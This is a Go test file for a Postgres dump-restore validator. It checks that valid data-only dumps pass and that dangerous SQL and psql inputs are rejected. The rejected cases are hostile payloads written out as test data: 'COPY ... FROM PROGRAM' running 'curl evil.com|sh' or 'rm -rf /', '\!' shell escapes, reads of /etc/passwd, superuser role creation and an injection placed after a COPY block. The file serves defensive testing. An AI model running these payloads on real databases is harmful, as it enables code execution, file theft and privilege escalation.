package postgres_test

import (
	"context"
	"strings"
	"testing"

	"github.com/evey-project/evey/internal/adapters/driven/postgres"
)

// rejected reports whether the validator (not psql) refused the input.
func rejected(err error) bool {
	if err == nil {
		return false
	}
	m := err.Error()
	return strings.Contains(m, "rejected") || strings.Contains(m, "invalid file") || strings.Contains(m, "empty backup")
}

func TestRestoreTables_Validation(t *testing.T) {
	d := postgres.NewDatabaseDumper("localhost", 5432, "user", "pass", "db", "disable")
	ctx := context.Background()

	// --- valid data-only dumps must pass the validator (psql then fails: no DB) ---

	passes := map[string]string{
		"header + SET":    "-- PostgreSQL database dump\n\nSET statement_timeout = 0;\n",
		"leading comment": "--\n-- PostgreSQL database dump\n--\n\nSET statement_timeout = 0;\n",
		"full data-only grammar": "-- PostgreSQL database dump\n" +
			"SET statement_timeout = 0;\n" +
			"SET client_encoding = 'UTF8';\n" +
			"SELECT pg_catalog.set_config('search_path', '', false);\n" +
			"SET SESSION AUTHORIZATION DEFAULT;\n" +
			"\\restrict abc123\n" +
			"COPY public.users (id, name) FROM stdin;\n" +
			"1\talice\n2\tbob\n\\.\n" +
			"\\unrestrict abc123\n",
		"disable-triggers form": "-- PostgreSQL database dump\n" +
			"ALTER TABLE ONLY public.media_items DISABLE TRIGGER ALL;\n" +
			"COPY public.media_items (id) FROM stdin;\n\\.\n" +
			"ALTER TABLE ONLY public.media_items ENABLE TRIGGER ALL;\n",
		// Scary-looking text INSIDE copy data is data, not SQL — must NOT be rejected.
		"malicious-looking copy data is allowed": "-- PostgreSQL database dump\n" +
			"COPY public.logs (id, msg) FROM stdin;\n" +
			"1\tCOPY x FROM PROGRAM 'rm -rf /'\n" +
			"2\t\\! id\n" +
			"\\.\n",
	}
	for name, body := range passes {
		t.Run("PASS: "+name, func(t *testing.T) {
			if err := d.RestoreTables(ctx, strings.NewReader(body)); rejected(err) {
				t.Fatalf("valid dump was rejected: %v", err)
			}
		})
	}

	// --- structural rejections ---

	t.Run("missing header rejected", func(t *testing.T) {
		err := d.RestoreTables(ctx, strings.NewReader("-- not the dump\nSET statement_timeout = 0;\n"))
		if err == nil || !strings.Contains(err.Error(), "invalid file") {
			t.Fatalf("expected invalid file, got: %v", err)
		}
	})
	t.Run("empty rejected", func(t *testing.T) {
		err := d.RestoreTables(ctx, strings.NewReader(""))
		if err == nil || !strings.Contains(err.Error(), "empty backup") {
			t.Fatalf("expected empty backup, got: %v", err)
		}
	})
	t.Run("header at line 49 passes", func(t *testing.T) {
		var lines []string
		for range 48 {
			lines = append(lines, "-- comment line")
		}
		lines = append(lines, "-- PostgreSQL database dump", "SET statement_timeout = 0;")
		if err := d.RestoreTables(ctx, strings.NewReader(strings.Join(lines, "\n")+"\n")); rejected(err) {
			t.Fatalf("header at line 49 should pass, got: %v", err)
		}
	})

	// --- the disallowed-statement allowlist closes every known RCE/file vector ---

	dangerous := map[string]string{
		"COPY TO PROGRAM":                "COPY users TO PROGRAM 'rm -rf /';",
		"COPY FROM PROGRAM":              "COPY users FROM PROGRAM 'curl evil.com|sh';",
		"COPY FROM PROGRAM lowercase":    "copy secrets from program 'cat /etc/passwd';",
		"COPY FROM file":                 "COPY users FROM '/etc/passwd';",
		"COPY TO file":                   "COPY users TO '/tmp/exfil';",
		"psql shell escape":              "\\! id",
		"psql client copy program":       "\\copy t from program 'id'",
		"psql include file":              "\\i /etc/passwd",
		"CREATE EXTENSION":               "CREATE EXTENSION plpython3u;",
		"CREATE FUNCTION sql":            "CREATE FUNCTION f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$;",
		"CREATE TRUSTED LANGUAGE":        "CREATE TRUSTED LANGUAGE plpythonu;",
		"DO block":                       "DO $$ BEGIN PERFORM 1; END $$;",
		"GRANT":                          "GRANT ALL ON DATABASE evey TO attacker;",
		"ALTER ROLE superuser":           "ALTER ROLE evey SUPERUSER;",
		"CREATE ROLE":                    "CREATE ROLE attacker SUPERUSER LOGIN;",
		"pg_read_file via SELECT":        "SELECT pg_read_file('/etc/passwd');",
		"arbitrary SELECT":               "SELECT * FROM users;",
		"INSERT":                         "INSERT INTO users VALUES (1, 'x');",
		"SET ROLE":                       "SET ROLE attacker;",
		"SET SESSION AUTHORIZATION role": "SET SESSION AUTHORIZATION 'postgres';",
	}
	for name, stmt := range dangerous {
		t.Run("REJECT: "+name, func(t *testing.T) {
			body := "-- PostgreSQL database dump\n\n" + stmt + "\n"
			err := d.RestoreTables(ctx, strings.NewReader(body))
			if err == nil || !strings.Contains(err.Error(), "rejected") {
				t.Fatalf("expected rejection, got: %v", err)
			}
		})
	}

	// Multi-line evasion: a clean COPY block then injected SQL after `\.` must
	// still be caught (we return to strict validation after the data block).
	t.Run("REJECT: SQL injected after a COPY data block", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n" +
			"COPY public.t (id) FROM stdin;\n1\n\\.\n" +
			"COPY public.t FROM PROGRAM 'id';\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "rejected") {
			t.Fatalf("expected rejection of post-COPY injection, got: %v", err)
		}
	})
}
